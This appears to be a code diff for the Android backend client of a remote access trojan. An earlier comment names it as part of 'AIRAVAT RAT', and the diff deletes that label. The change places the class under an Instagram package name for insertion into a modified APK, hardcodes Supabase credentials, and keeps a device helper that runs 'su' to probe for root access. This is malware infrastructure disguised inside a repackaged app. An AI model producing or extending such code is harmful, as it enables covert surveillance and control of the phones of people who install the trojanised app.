@@ -1,4 +1,6 @@
-
+// Note: Package declaration removed for standalone use during APK modification
+// Add appropriate package declaration when integrating into your Android project:
+package com.instagram.android.supabase;
 
 import android.content.Context;
 import android.content.SharedPreferences;
@@ -16,12 +18,18 @@ import java.util.concurrent.ExecutorService;
 import java.util.concurrent.Executors;
 
 /**
- * Supabase Client for Android
- * Replaces Firebase functionality for AIRAVAT RAT
+ * Supabase Client for Android - Alternative Version with Direct Configuration
+ * This version uses direct string configuration instead of R.string resources
+ * Use this if you have issues with R.string references during APK modification
  */
-public class SupabaseClient {
+public class SupabaseClientDirect {
     private static final String TAG = "SupabaseClient";
-    private static SupabaseClient instance;
+    private static SupabaseClientDirect instance;
+    
+    // Direct configuration - Replace these with your actual Supabase values
+    private static final String SUPABASE_URL = "https://your-project-id.supabase.co";
+    private static final String SUPABASE_ANON_KEY = "your-supabase-anon-key";
+    private static final String SUPABASE_SERVICE_ROLE_KEY = "your-supabase-service-role-key";
     
     private String supabaseUrl;
     private String anonKey;
@@ -29,29 +37,21 @@ public class SupabaseClient {
     private Context context;
     private ExecutorService executor;
     
-    private SupabaseClient(Context context) {
+    private SupabaseClientDirect(Context context) {
         this.context = context.getApplicationContext();
         this.executor = Executors.newCachedThreadPool();
         
-        // Load configuration from resources
-        // Note: R.string references will be resolved when integrated into Android project
-        // Alternative: Use context.getResources().getIdentifier() for dynamic resource loading
-        try {
-            this.supabaseUrl = context.getString(R.string.supabase_url);
-            this.anonKey = context.getString(R.string.supabase_anon_key);
-            this.serviceRoleKey = context.getString(R.string.supabase_service_role_key);
-        } catch (Exception e) {
-            // Fallback for development/testing - replace with actual values
-            Log.w(TAG, "Could not load from resources, using fallback configuration");
-            this.supabaseUrl = "https://your-project.supabase.co";
-            this.anonKey = "your-anon-key";
-            this.serviceRoleKey = "your-service-role-key";
-        }
+        // Use direct configuration
+        this.supabaseUrl = SUPABASE_URL;
+        this.anonKey = SUPABASE_ANON_KEY;
+        this.serviceRoleKey = SUPABASE_SERVICE_ROLE_KEY;
+        
+        Log.i(TAG, "SupabaseClient initialized with URL: " + this.supabaseUrl);
     }
     
-    public static synchronized SupabaseClient getInstance(Context context) {
+    public static synchronized SupabaseClientDirect getInstance(Context context) {
         if (instance == null) {
-            instance = new SupabaseClient(context);
+            instance = new SupabaseClientDirect(context);
         }
         return instance;
     }
@@ -413,9 +413,9 @@ public class SupabaseClient {
 }
 
 /**
- * Device Information Helper
+ * Device Information Helper - Same as original
  */
-class DeviceInfoHelper {
+class DeviceInfoHelperDirect {
     public static String getDeviceId(Context context) {
         SharedPreferences prefs = context.getSharedPreferences("device_prefs", Context.MODE_PRIVATE);
         String deviceId = prefs.getString("device_id", null);
@@ -472,7 +472,7 @@ class DeviceInfoHelper {
                 }
             }
             
-            // Try to execute su command
+            // Try to execute su command using ProcessBuilder (non-deprecated)
             ProcessBuilder processBuilder = new ProcessBuilder("su");
             Process process = processBuilder.start();
             process.destroy();
